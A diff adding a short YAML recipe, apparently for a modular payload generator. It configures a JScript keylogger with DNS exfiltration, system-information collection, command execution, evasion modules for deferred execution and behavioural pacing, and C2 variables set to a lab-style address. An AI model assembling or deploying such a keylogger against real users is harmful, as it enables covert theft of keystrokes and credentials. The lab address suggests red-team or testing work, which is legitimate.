@@ -1,0 +1,26 @@
+name: js_keylogger_dns
+description: JScript keylogger with DNS exfiltration
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+
+keylogger: collectors/keylogger_staged
+
+exfil: exfil/dns_exfil
+arch: arch/keylogger
+
+evasion:
+  - evasion/deferred_exec
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  KEYLOG_DURATION: "30"
+  DNS_SERVER: "10.0.2.2"
